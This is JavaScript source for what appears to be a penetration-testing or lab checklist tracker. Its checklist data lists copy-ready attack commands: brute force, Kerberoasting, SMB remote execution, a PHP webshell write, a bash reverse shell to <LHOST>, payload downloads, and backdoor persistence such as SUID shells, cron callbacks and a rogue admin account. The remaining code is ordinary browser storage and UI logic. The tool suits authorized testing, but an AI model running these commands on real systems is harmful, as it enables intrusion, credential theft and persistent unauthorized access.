        { desc: 'Connect to MongoDB shell', cmd: 'mongo --host <TARGET_IP> --port 27017' },
        { desc: 'Enumerate MongoDB with nmap scripts', cmd: 'nmap --script mongodb-info,mongodb-databases -p27017 <TARGET_IP>' },
      ]},
      { id: 'recon-28', name: 'Elasticsearch Enumeration (9200)', description: 'Index exposure and REST API checks on Elasticsearch.', commands: [
        { desc: 'List all Elasticsearch indices via API', cmd: 'curl -s http://<TARGET_IP>:9200/_cat/indices?v' },
        { desc: 'HTTP enum scan on Elasticsearch port', cmd: 'nmap --script http-enum -p9200 <TARGET_IP>' },
      ]},
      { id: 'recon-29', name: 'Memcached Enumeration (11211)', description: 'Memcached information leakage checks.', commands: [
        { desc: 'Retrieve Memcached server stats via netcat', cmd: 'echo stats | nc <TARGET_IP> 11211' },
        { desc: 'Enumerate Memcached with nmap info script', cmd: 'nmap --script memcached-info -p11211 <TARGET_IP>' },
      ]},
      { id: 'recon-30', name: 'VNC Enumeration (5900)', description: 'VNC auth mechanism and display info checks.', commands: [
        { desc: 'Enumerate VNC info and display title with nmap', cmd: 'nmap --script vnc-info,vnc-title -p5900 <TARGET_IP>' },
      ]},
      { id: 'recon-31', name: 'Vulnerability Scan (Nmap NSE)', description: 'Run NSE vulnerability scripts against all discovered open ports.', commands: [
        { desc: 'Run NSE vuln scripts against open ports', cmd: 'nmap --script vuln -p<OPEN_PORTS> <TARGET_IP>' },
      ]},
    ],
  },
  {
    id: 'exploitation',
    name: 'Exploitation',
    optional: false,
    items: [
      { id: 'exploit-1', name: 'Searchsploit Lookup', command: 'searchsploit <SERVICE> <VERSION>', description: 'Map services to known exploits.' },
      { id: 'exploit-2', name: 'FTP Credential Attack (21)', command: 'hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>\nmedusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp', description: 'Brute force/default creds on FTP.' },
      { id: 'exploit-3', name: 'SSH Credential Attack (22)', command: 'hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>\nssh <USER>@<TARGET_IP>', description: 'Password spray and valid credential validation.' },
      { id: 'exploit-4', name: 'SMTP Relay / VRFY Abuse (25/465/587)', command: 'swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>\nnmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>', description: 'Test relay misconfig and user enumeration.' },
      { id: 'exploit-5', name: 'IMAP/POP Mailbox Brute (110/143/993/995)', command: 'hydra -L users.txt -P passwords.txt imap://<TARGET_IP>\nhydra -L users.txt -P passwords.txt pop3://<TARGET_IP>', description: 'Mailbox auth attacks.' },
      { id: 'exploit-6', name: 'Kerberos AS-REP / Kerberoast (88)', command: 'impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request', description: 'Domain credential extraction via Kerberos.' },
      { id: 'exploit-7', name: 'RPC/SMB Null Session & Share Abuse (135/139/445)', command: 'rpcclient -U "" -N <TARGET_IP>\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares', description: 'Anonymous/domain share abuse paths.' },
      { id: 'exploit-8', name: 'SMB Remote Exec (445)', command: 'impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>', description: 'Command execution through SMB with valid creds/hash.' },
      { id: 'exploit-9', name: 'LDAP Credentialed Abuse (389/636/3268/3269)', command: 'ldapsearch -x -H ldap://<TARGET_IP> -D "<USER_DN>" -w <PASS> -b "dc=domain,dc=local"\npython3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>', description: 'Enumerate AD abuse paths with valid creds.' },
      { id: 'exploit-10', name: 'NFS no_root_squash Abuse (2049)', command: 'mkdir /tmp/nfs\nmount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs\ncp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash', description: 'Exploit writable NFS exports for privesc foothold.' },
      { id: 'exploit-11', name: 'MSSQL Command Execution (1433)', command: 'impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>\nEXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";', description: 'Leverage SQL Server to execute OS commands.' },
      { id: 'exploit-12', name: 'MySQL UDF / File Write Abuse (3306)', command: 'mysql -h <TARGET_IP> -u <USER> -p\nSELECT @@secure_file_priv;\nSELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";', description: 'Abuse FILE/UDF permissions on MySQL.' },
      { id: 'exploit-13', name: 'PostgreSQL Command Exec (5432)', command: 'psql -h <TARGET_IP> -U <USER>\nCOPY (SELECT \"bash -c \'id\'\") TO PROGRAM \"bash\";', description: 'Use PostgreSQL feature abuse for command execution.' },
      { id: 'exploit-14', name: 'Oracle Account/SID Abuse (1521)', command: 'odat passwordguesser -s <TARGET_IP> -d <SID>\nodat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>', description: 'Exploit weak Oracle credentials and misconfig.' },
      { id: 'exploit-15', name: 'Redis Unauthorized Write (6379)', command: 'redis-cli -h <TARGET_IP>\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSET crack "<PUBKEY>"\nSAVE', description: 'Turn unauth Redis into persistence/RCE foothold.' },
      { id: 'exploit-16', name: 'MongoDB Unauth Data Access (27017)', command: 'mongo --host <TARGET_IP> --port 27017\nshow dbs\nuse admin\nshow collections', description: 'Exploit unauth MongoDB exposure.' },
      { id: 'exploit-17', name: 'RDP Password Spray (3389)', command: 'crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt\nxfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>', description: 'Credential attack and desktop access validation.' },
      { id: 'exploit-18', name: 'SQL Injection', command: 'sqlmap -u "http://<TARGET_IP>/page?id=1" --dbs --batch', description: 'Detect and exploit SQLi.' },
      { id: 'exploit-19', name: 'Local File Inclusion (LFI)', command: 'http://<TARGET_IP>/page?file=../../../../etc/passwd', description: 'LFI testing and bypasses.' },
      { id: 'exploit-20', name: 'Remote File Inclusion (RFI)', command: 'python3 -m http.server 80\nhttp://<TARGET_IP>/page?file=http://<LHOST>/shell.php', description: 'RFI testing flow.' },
      { id: 'exploit-21', name: 'Command Injection', command: '; id\n| id\n$(id)', description: 'Detect command injection vectors.' },
      { id: 'exploit-22', name: 'File Upload Bypass', command: 'Try .php/.phtml and content-type bypasses.', description: 'Upload filter bypass tests.' },
      { id: 'exploit-23', name: 'Reverse Shell (Setup Listener)', command: 'nc -lvnp <LPORT>', description: 'Set up listener for shell callbacks.' },
      { id: 'exploit-24', name: 'Reverse Shell Payloads', command: 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1', description: 'Common shell payloads.' },
      { id: 'exploit-25', name: 'Shell Upgrade / Stabilize', command: 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"', description: 'Upgrade to interactive TTY.' },
      { id: 'exploit-26', name: 'Password Brute Force', command: 'hydra -l <USER> -P rockyou.txt ssh://<TARGET_IP>', description: 'Credential brute force checks.' },
      { id: 'exploit-27', name: 'Hash Cracking', command: 'hashid <HASH>\njohn --wordlist=rockyou.txt hash.txt', description: 'Identify and crack hashes.' },
      { id: 'exploit-28', name: 'File Transfer to Target', command: 'python3 -m http.server 80\nwget http://<LHOST>/file -O /tmp/file', description: 'Deliver tools and payloads.' },
    ],
  },
  {
    id: 'post_exploitation',
    name: 'Post-Exploitation',
    optional: false,
    items: [
      { id: 'post-1', name: 'Linux: Basic Enumeration', command: 'whoami && id\nuname -a\nip a', description: 'Gather baseline Linux host data.' },
      { id: 'post-2', name: 'Linux: Run LinPEAS', command: 'wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh', description: 'Automated Linux privesc checks.' },
      { id: 'post-3', name: 'Linux: Sudo Permissions', command: 'sudo -l', description: 'Assess sudo abuse opportunities.' },
      { id: 'post-4', name: 'Linux: SUID/SGID Binaries', command: 'find / -perm -4000 -type f 2>/dev/null', description: 'Identify SUID/SGID escalation vectors.' },
      { id: 'post-5', name: 'Linux: Capabilities', command: 'getcap -r / 2>/dev/null', description: 'Check capability-based privilege paths.' },
      { id: 'post-6', name: 'Linux: Cron Jobs', command: 'crontab -l\ncat /etc/crontab', description: 'Scheduled task discovery.' },
      { id: 'post-7', name: 'Linux: Writable Files & Dirs', command: 'find / -writable -type f 2>/dev/null', description: 'Writable paths for escalation.' },
      { id: 'post-8', name: 'Linux: Network & Internal Services', command: 'ss -tlnp\nip route\ncat /etc/hosts', description: 'Internal pivots and services.' },
      { id: 'post-9', name: 'Linux: Kernel Exploits', command: 'uname -r\nsearchsploit linux kernel <VERSION>', description: 'Kernel exploit triage.' },
      { id: 'post-10', name: 'Linux: NFS Shares', command: 'showmount -e <TARGET_IP>', description: 'NFS misconfiguration checks.' },
      { id: 'post-11', name: 'Windows: Basic Enumeration', command: 'whoami /all\nsysteminfo\nipconfig /all', description: 'Baseline Windows host profile.' },
      { id: 'post-12', name: 'Windows: Run WinPEAS', command: 'certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe', description: 'Automated Windows privesc checks.' },
      { id: 'post-13', name: 'Windows: Service Misconfigurations', command: 'sc query\nsc qc <SERVICE_NAME>', description: 'Service configuration abuse checks.' },
      { id: 'post-14', name: 'Windows: Token Impersonation', command: 'whoami /priv', description: 'Check impersonation opportunities.' },
      { id: 'post-15', name: 'Windows: Stored Credentials', command: 'cmdkey /list', description: 'Stored secret discovery.' },
      { id: 'post-16', name: 'Windows: AlwaysInstallElevated', command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'MSI privilege escalation path.' },
      { id: 'post-17', name: 'Windows: Pass the Hash', command: 'impacket-psexec admin@<TARGET_IP> -hashes :<NTLM_HASH>', description: 'Lateral movement with NTLM hashes.' },
      { id: 'post-18', name: 'Windows: Kerberoasting', command: 'impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request', description: 'Service ticket extraction and cracking.' },
      { id: 'post-19', name: 'Linux: NFS Pivot Validation (111/2049)', command: 'showmount -e <TARGET_IP>\nmount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs', description: 'Validate NFS pivot opportunities after foothold.' },
      { id: 'post-20', name: 'Linux: Harvest DB Secrets (3306/5432/6379/27017)', command: 'grep -R "password\|passwd\|DB_" /var/www /opt /home 2>/dev/null\ncat /etc/*conf 2>/dev/null | grep -Ei "mysql|postgres|redis|mongo"', description: 'Extract creds for lateral movement into data services.' },
      { id: 'post-21', name: 'Windows: AD Enumeration (88/389/636/3268/3269)', command: 'nltest /dclist:<DOMAIN>\nGet-ADDomain\nGet-ADUser -Filter * -Properties *', description: 'Deep AD and trust/path analysis from compromised host.' },
      { id: 'post-22', name: 'Windows: SMB Lateral Movement Prep (139/445)', command: 'net view /domain\nnet use \\<TARGET_IP>\C$ /user:<DOMAIN>\\<USER> <PASS>', description: 'Enumerate reachable hosts and admin shares.' },
      { id: 'post-23', name: 'Windows: WinRM Lateral Movement (5985/5986)', command: 'Test-WSMan <TARGET_IP>\nevil-winrm -i <TARGET_IP> -u <USER> -p <PASS>', description: 'Validate PowerShell remoting movement paths.' },
      { id: 'post-24', name: 'Loot: Flags & Sensitive Files', command: 'find / -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null', description: 'Hunt for proof and sensitive files.' },
    ],
  },
  {
    id: 'persistence',
    name: 'Persistence',
    optional: true,
    items: [
      { id: 'persist-1', name: 'Linux: SSH Key Persistence', command: 'ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key', description: 'Add persistent SSH key access.' },
      { id: 'persist-2', name: 'Linux: Cron Job Backdoor', command: '(crontab -l; echo "* * * * * /bin/bash -c ...") | crontab -', description: 'Recurring callback task.' },
      { id: 'persist-3', name: 'Linux: SUID Backdoor', command: 'cp /bin/bash /tmp/.hidden_shell\nchmod u+s /tmp/.hidden_shell', description: 'SUID shell persistence.' },
      { id: 'persist-4', name: 'Linux: Systemd Service', command: 'systemctl enable backdoor.service', description: 'Persistent service callback.' },
      { id: 'persist-5', name: 'Windows: Registry Run Key', command: 'reg add "HKCU\\...\\Run" /v Updater /t REG_SZ /d "C:\\Temp\\shell.exe" /f', description: 'Autorun persistence.' },
      { id: 'persist-6', name: 'Windows: Scheduled Task', command: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Temp\\shell.exe" /sc minute /mo 5 /ru SYSTEM', description: 'Scheduled persistent execution.' },
      { id: 'persist-7', name: 'Windows: New Admin User', command: 'net user hacker Password123! /add\nnet localgroup Administrators hacker /add', description: 'Create persistent privileged account.' },
      { id: 'persist-8', name: 'Windows: Golden Ticket (AD)', command: 'mimikatz kerberos::golden ...', description: 'Domain-level persistence.' },
    ],
  },
];

const defaultState = {
  ui: {
    sidebarCollapsed: false,
    mindmapMode: 'tree',
    machineTab: 'checklist',
    openPhases: ['recon'],
    showAddMachine: false,
    showAddGlobalCred: false,
    showAddMachineCred: false,
    showAddFinding: false,
    mmPhase: 'all',
    checklistTaskFilter: 'all',
  },
  reveal: {},
  machines: [],
  credentials: [],
  findings: [],
  activities: [],
};

function isLegacySeedData(payload) {
  const machineIds = (payload?.machines || []).map((machine) => machine.id).sort();
  const credentialIds = (payload?.credentials || []).map((credential) => credential.id).sort();
  const findingIds = (payload?.findings || []).map((finding) => finding.id).sort();
  const activityIds = (payload?.activities || []).map((activity) => activity.id).sort();

  return machineIds.join(',') === 'm1,m2'
    && credentialIds.join(',') === 'c1'
    && findingIds.join(',') === 'f1,f2'
    && activityIds.join(',') === 'a1,a10,a11,a12,a13,a14,a2,a3,a4,a5,a6,a7,a8,a9';
}

function hydrateState() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return structuredClone(defaultState);
    const parsed = JSON.parse(raw);
    if (isLegacySeedData(parsed)) {
      localStorage.removeItem(STORAGE_KEY);
      return structuredClone(defaultState);
    }
    const merged = {
      ...structuredClone(defaultState),
      ...parsed,
      ui: { ...structuredClone(defaultState).ui, ...(parsed.ui || {}) },
    };
    merged.machines = (merged.machines || []).map((machine) => ({
      ...machine,
      selected_ports: machine.selected_ports || [],
      completed_items: machine.completed_items || [],
      item_notes: machine.item_notes || {},
      item_evidence: machine.item_evidence || {},
      archived_evidence: machine.archived_evidence || [],
      archived_credentials: machine.archived_credentials || [],
    }));
    merged.findings = (merged.findings || []).map((finding) => ({
      ...finding,
      evidence: finding.evidence || [],
      phase: finding.phase || 'osint',
      severity: finding.severity || 'info',
      category: finding.category || 'finding',
      parent_id: finding.parent_id || null,
      source_checklist_item_id: finding.source_checklist_item_id || null,
      created_at: finding.created_at || new Date().toISOString(),
      updated_at: finding.updated_at || finding.created_at || new Date().toISOString(),
    }));
    merged.credentials = (merged.credentials || []).map((cred) => ({
      ...cred,
      finding_id: cred.finding_id || null,
      created_at: cred.created_at || new Date().toISOString(),
    }));
    return merged;
  } catch {
    return structuredClone(defaultState);
  }
}

const state = hydrateState();

/* ── Phase ordering helpers (used for cross-phase parenting) ── */
const PHASE_ORDER_GLOBAL = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
function getPreviousPhase(phaseId) {
  const idx = PHASE_ORDER_GLOBAL.indexOf(phaseId);
  return idx > 0 ? PHASE_ORDER_GLOBAL[idx - 1] : null;
}
function getNextPhase(phaseId) {
  const idx = PHASE_ORDER_GLOBAL.indexOf(phaseId);
  return (idx >= 0 && idx < PHASE_ORDER_GLOBAL.length - 1) ? PHASE_ORDER_GLOBAL[idx + 1] : null;
}
/**
 * Build eligible parents for a finding.
 * Same-phase: any finding in the same phase (except self/descendants).
 * Cross-phase: ONLY root-level findings may have a parent from the previous phase.
 *   A finding is "root-level" if it has no parent_id within its own phase.
 *   Cross-phase parents must be from the immediately previous phase only.
 */
function buildEligibleParents(machineId, findingPhase, excludeIds) {
  const all = machineFindings(machineId);
  const samePhase = all.filter(f => !excludeIds.has(f.id) && f.phase === findingPhase);
  const prevPhase = getPreviousPhase(findingPhase);
  const crossPhase = prevPhase ? all.filter(f => !excludeIds.has(f.id) && f.phase === prevPhase) : [];
  return { samePhase, crossPhase, prevPhaseId: prevPhase };
}

const statusConfig = {
  pending: { label: 'None', colorClass: 'status-pending' },
  scanning: { label: 'Initial Recon', colorClass: 'status-scanning' },
  user_shell: { label: 'Low-Level Exploited', colorClass: 'status-user_shell' },
  root_shell: { label: 'Root-Level Exploited', colorClass: 'status-root_shell' },
  completed: { label: 'Completed', colorClass: 'status-completed' },
};

const severityClass = {
  critical: 'severity-critical',
  high: 'severity-high',
  medium: 'severity-medium',
  low: 'severity-low',
  info: 'severity-info',
};

const main = document.getElementById('main');
const sidebar = document.getElementById('sidebar');
const brand = document.getElementById('brand');
let findingEvidenceBuffer = [];
let mmResizeObserver = null;
let mmPanCleanup = null;
let mmFsMachineId = null;
let mainScrollLockTop = 0;
let mainScrollLockHandler = null;
let isMainScrollLocked = false;

function releaseModalLocks() {
  document.body.classList.remove('modal-active');
  document.documentElement.classList.remove('modal-active');
  document.documentElement.style.overflow = '';
  document.body.style.overflow = '';
  if (main) {
    if (mainScrollLockHandler) {
      main.removeEventListener('scroll', mainScrollLockHandler);
      mainScrollLockHandler = null;
    }
    main.style.overflow = 'auto';
  }
  isMainScrollLocked = false;
}





function persist() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
}

function uid(prefix) {
  return `${prefix}${Math.random().toString(36).slice(2, 8)}`;
}

let evidenceDbPromise;

function openEvidenceDb() {
  if (evidenceDbPromise) return evidenceDbPromise;
  evidenceDbPromise = new Promise((resolve, reject) => {
    const request = indexedDB.open(EVIDENCE_DB_NAME, EVIDENCE_DB_VERSION);
    request.onupgradeneeded = () => {
      const database = request.result;
      if (!database.objectStoreNames.contains(EVIDENCE_STORE_NAME)) {
        database.createObjectStore(EVIDENCE_STORE_NAME, { keyPath: 'id' });
      }
    };
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
  return evidenceDbPromise;
}

async function putEvidenceFile(file) {
  const database = await openEvidenceDb();
  const record = {
    id: uid('e'),
    blob: file,
    name: file.name,
    type: file.type || 'application/octet-stream',
    size: file.size,
    created_at: nowStamp(),
  };
  await new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readwrite');
    tx.objectStore(EVIDENCE_STORE_NAME).put(record);
    tx.oncomplete = () => resolve();
    tx.onerror = () => reject(tx.error);
  });
  return {
    id: record.id,
    name: record.name,
    type: record.type,
    size: record.size,
    created_at: record.created_at,
  };
}

async function getEvidenceFile(id) {
  const database = await openEvidenceDb();
  return new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readonly');
    const request = tx.objectStore(EVIDENCE_STORE_NAME).get(id);
    request.onsuccess = () => resolve(request.result || null);
    request.onerror = () => reject(request.error);
  });
}

async function deleteEvidenceFile(id) {
  const database = await openEvidenceDb();
  await new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readwrite');
    tx.objectStore(EVIDENCE_STORE_NAME).delete(id);
    tx.oncomplete = () => resolve();
    tx.onerror = () => reject(tx.error);
  });
}

async function updateEvidenceRecordName(id, name) {
  const database = await openEvidenceDb();
  await new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readwrite');
    const store = tx.objectStore(EVIDENCE_STORE_NAME);
    const request = store.get(id);
    request.onsuccess = () => {
      const record = request.result;
      if (!record) {
        resolve();
        return;
      }
      record.name = name;
      store.put(record);
    };
    request.onerror = () => reject(request.error);
    tx.oncomplete = () => resolve();
    tx.onerror = () => reject(tx.error);
  });
}

async function clearEvidenceStore() {
  const database = await openEvidenceDb();
  await new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readwrite');
    tx.objectStore(EVIDENCE_STORE_NAME).clear();
    tx.oncomplete = () => resolve();
    tx.onerror = () => reject(tx.error);
  });
}

/* ── Evidence Preview Overlay ─────────────────── */
let _evidenceOverlayUrl = null;

function openEvidencePreview(blobOrId) {
  const dialog = document.getElementById('evidencePreviewOverlay');
  if (!dialog) return;
  const img = dialog.querySelector('.ev-preview-img');
  const obj = dialog.querySelector('.ev-preview-object');
  const loading = dialog.querySelector('.ev-preview-loading');

  function show(blob, name, type) {
    if (_evidenceOverlayUrl) { URL.revokeObjectURL(_evidenceOverlayUrl); _evidenceOverlayUrl = null; }
    const url = URL.createObjectURL(blob);
    _evidenceOverlayUrl = url;
    const isImage = type && type.startsWith('image/');
    if (isImage) {
      img.src = url;
      img.alt = name || 'Evidence';
      img.style.display = '';
      obj.style.display = 'none';
    } else {
      obj.data = url;
      obj.type = type || 'application/octet-stream';
      obj.style.display = '';
      img.style.display = 'none';
    }
    loading.style.display = 'none';
  }

  /* Reset display states */
  loading.style.display = '';
  img.style.display = 'none';
  obj.style.display = 'none';

  /* showModal() puts it in the top layer, above all other dialogs */
  try {
    if (!dialog.open) dialog.showModal();
  } catch {
    return;
  }

  if (blobOrId instanceof Blob) {
    show(blobOrId, '', blobOrId.type);
    return;
  }

  /* id string → fetch from IndexedDB */
  getEvidenceFile(blobOrId).then(record => {
    if (!record?.blob) { closeEvidencePreview(); return; }
    show(record.blob, record.name, record.type);
  }).catch(() => {
    closeEvidencePreview();
  });
}

function closeEvidencePreview() {
  const dialog = document.getElementById('evidencePreviewOverlay');
  if (!dialog) return;
  if (dialog.open) dialog.close();
  if (_evidenceOverlayUrl) { URL.revokeObjectURL(_evidenceOverlayUrl); _evidenceOverlayUrl = null; }
  const img = dialog.querySelector('.ev-preview-img');
  const obj = dialog.querySelector('.ev-preview-object');
  if (img) { img.src = ''; img.style.display = 'none'; }
  if (obj) { obj.data = ''; obj.style.display = 'none'; }
}

/* Close preview on backdrop click */
document.addEventListener('DOMContentLoaded', () => {
  const dlg = document.getElementById('evidencePreviewOverlay');
  if (dlg) dlg.addEventListener('click', (e) => {
    if (e.target === dlg) closeEvidencePreview();
  });
});

async function requestPersistentStorage() {
  if (!navigator.storage?.persist) return;
  try {
    await navigator.storage.persist();
  } catch {
  }
}

function getImageFilesFromList(files) {
  return Array.from(files || []).filter((file) => file && file.type && file.type.startsWith('image/'));
}

async function getEvidenceUsageBytes() {
  const database = await openEvidenceDb();
  return new Promise((resolve, reject) => {
    const tx = database.transaction(EVIDENCE_STORE_NAME, 'readonly');
    const store = tx.objectStore(EVIDENCE_STORE_NAME);
    let total = 0;
    const cursor = store.openCursor();
    cursor.onsuccess = (event) => {
      const row = event.target.result;
      if (!row) {
        resolve(total);
        return;
      }
      const value = row.value || {};
      total += Number(value.size || value.blob?.size || 0);
      row.continue();
    };
    cursor.onerror = () => reject(cursor.error);
  });
}

async function getAppUsageBytes() {
  const localRaw = localStorage.getItem(STORAGE_KEY) || '';
  const stateBytes = new TextEncoder().encode(localRaw).length;
  const evidenceBytes = await getEvidenceUsageBytes();
  return {
    total: stateBytes + evidenceBytes,
    stateBytes,
    evidenceBytes,
  };
}

function routePath() {
  return (window.location.hash.replace('#', '') || '/').trim();
}

function parseMachineRoute(path) {
  const match = path.match(/^\/machine\/([^/]+)$/);
  return match ? match[1] : null;
}

function nowStamp() {
  return new Date().toISOString();
}

function formatDate(value) {
  return new Date(value).toLocaleString(undefined, {
    month: 'short',
    day: 'numeric',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false,
  });
}

function formatShort(value) {
  return new Date(value).toLocaleString(undefined, {
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false,
  });
}

function formatTime(value) {
  return new Date(value).toLocaleTimeString(undefined, { hour12: false });
}

function formatDateTimeMilitary(value) {
  if (!value) return '—';
  const d = new Date(value);
  if (isNaN(d)) return '—';
  const dd = String(d.getDate()).padStart(2, '0');
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  const yy = String(d.getFullYear()).slice(-2);
  const hh = String(d.getHours()).padStart(2, '0');
  const mi = String(d.getMinutes()).padStart(2, '0');
  const ss = String(d.getSeconds()).padStart(2, '0');
  return `${hh}:${mi}:${ss} ${dd}/${mm}/${yy}`;
}

function relative(value) {
  const diff = Date.now() - new Date(value).getTime();
  const mins = Math.max(1, Math.floor(diff / 60000));
  if (mins < 60) return `${mins} minute${mins !== 1 ? 's' : ''} ago`;
  const hours = Math.floor(mins / 60);
  return `about ${hours} hour${hours !== 1 ? 's' : ''} ago`;
}

function formatBytes(bytes) {
  if (!Number.isFinite(bytes) || bytes <= 0) return '0 B';
  const units = ['B', 'KB', 'MB', 'GB', 'TB'];
  let value = bytes;
  let unitIndex = 0;
  while (value >= 1024 && unitIndex < units.length - 1) {
    value /= 1024;
    unitIndex += 1;
  }
  const digits = value >= 100 ? 0 : value >= 10 ? 1 : 2;
  return `${value.toFixed(digits)} ${units[unitIndex]}`;
}

async function updateStorageMeters() {
  const appMeter = document.getElementById('appStorageMeter');
  const browserMeter = document.getElementById('browserStorageMeter');
  if (!appMeter && !browserMeter) return;

  try {
    const appUsage = await getAppUsageBytes();
    if (appMeter) {
      appMeter.textContent = `App Data: ${formatBytes(appUsage.total)} (State ${formatBytes(appUsage.stateBytes)} + Evidence ${formatBytes(appUsage.evidenceBytes)})`;
    }
  } catch {
    if (appMeter) appMeter.textContent = 'App Data: unavailable';
  }

  if (!navigator.storage?.estimate) {
    if (browserMeter) browserMeter.textContent = 'Browser Quota: unavailable in this browser';
    return;
  }

  try {
    const estimate = await navigator.storage.estimate();
    const used = estimate.usage || 0;
    const quota = estimate.quota || 0;
    const percent = quota ? Math.min(100, Math.round((used / quota) * 100)) : 0;
    if (browserMeter) {
      browserMeter.textContent = `Browser Quota: ${formatBytes(used)} / ${formatBytes(quota)} (${percent}%)`;
    }
  } catch {
    if (browserMeter) browserMeter.textContent = 'Browser Quota: unavailable';
  }
}

function extractPortsFromReconItem(item) {
  const match = item.name.match(/\(([^)]+)\)/);
  if (!match) return [];
  const ports = (match[1] || '').match(/\d+/g) || [];
  return Array.from(new Set(ports));
}

function getReconPortOptions() {
  const reconPhase = checklistPhases.find((phase) => phase.id === 'recon');
  if (!reconPhase) return [];
  const portSet = new Set();
  reconPhase.items.forEach((item) => {
    extractPortsFromReconItem(item).forEach((port) => portSet.add(port));
  });
  return Array.from(portSet).sort((a, b) => Number(a) - Number(b));
}

function isItemApplicableForMachine(machine, phaseId, item) {
  if (phaseId === 'recon') {
    const selectedPorts = new Set(machine.selected_ports || []);
    if (!selectedPorts.size) return true;
    const itemPorts = extractPortsFromReconItem(item);
    if (!itemPorts.length) return true;
    return itemPorts.some((port) => selectedPorts.has(port));
  }

  if (phaseId === 'post_exploitation') {
    const itemName = (item.name || '').toLowerCase();
    if (itemName.startsWith('linux:')) return machine.os_type === 'linux';
    if (itemName.startsWith('windows:')) return machine.os_type === 'windows';
    return true;
  }

  if (phaseId === 'persistence') {
    const itemName = (item.name || '').toLowerCase();
    if (itemName.startsWith('linux:')) return machine.os_type === 'linux';
    if (itemName.startsWith('windows:')) return machine.os_type === 'windows';
    return true;
  }

  return true;
}

function checklistItemById(itemId) {
  return checklistPhases.flatMap((phase) => phase.items).find((item) => item.id === itemId) || null;
}

function checklistPhaseForItem(itemId) {
  return checklistPhases.find((phase) => phase.items.some((item) => item.id === itemId)) || null;
}

function formatActionLabel(action) {
  return String(action || '').replace(/_/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase());
}

function showCopyFeedback(anchor, message = 'Copied!') {
  if (!anchor) return;
  document.querySelectorAll('.copy-feedback-toast').forEach((toast) => toast.remove());

  const rect = anchor.getBoundingClientRect();
  const toast = document.createElement('div');
  toast.className = 'copy-feedback-toast';
  toast.textContent = message;
  toast.style.left = `${Math.round(rect.right + 8)}px`;
  toast.style.top = `${Math.round(rect.top + rect.height / 2)}px`;
  document.body.appendChild(toast);

  requestAnimationFrame(() => {
    toast.classList.add('show');
  });

  window.setTimeout(() => {
    toast.classList.remove('show');
    window.setTimeout(() => toast.remove(), 150);
  }, 900);
}

function getApplicableItems(machine) {
  return checklistPhases.reduce((items, phase) => {
    const filteredItems = phase.items.filter((item) => isItemApplicableForMachine(machine, phase.id, item));
    return [...items, ...filteredItems];
  }, []);
}

function getPhaseProgress(phase, completedItems) {
  const total = phase.items.length;
  if (!total) return 0;
  const completed = phase.items.filter((item) => completedItems.includes(item.id)).length;
  return Math.round((completed / total) * 100);
}

function getTotalProgress(machine) {
  const applicable = getApplicableItems(machine);
  if (!applicable.length) return 0;
  const completed = applicable.filter((item) => (machine.completed_items || []).includes(item.id)).length;
  return Math.round((completed / applicable.length) * 100);
}

function addActivity(action, details, machineId) {
  state.activities.unshift({
    id: uid('a'),
    action,
    details,
    machine_id: machineId,
    timestamp: nowStamp(),
  });
}

function machineById(id) {
  return state.machines.find((machine) => machine.id === id);
}

function machineCredentials(machineId) {
  return state.credentials.filter((credential) => credential.machine_id === machineId);
}

function phaseColor(pid) {
  if (pid === 'osint') return '#a78bfa';
  if (pid === 'recon') return '#22d3ee';
  if (pid === 'exploitation') return '#f97316';
  if (pid === 'post_exploitation') return '#f43f5e';
  if (pid === 'persistence') return '#3b82f6';
  return 'var(--text)';
}

function machineFindings(machineId) {
  return state.findings.filter((finding) => finding.machine_id === machineId);
}

function machineActivity(machineId) {
  return state.activities.filter((activity) => activity.machine_id === machineId);
}

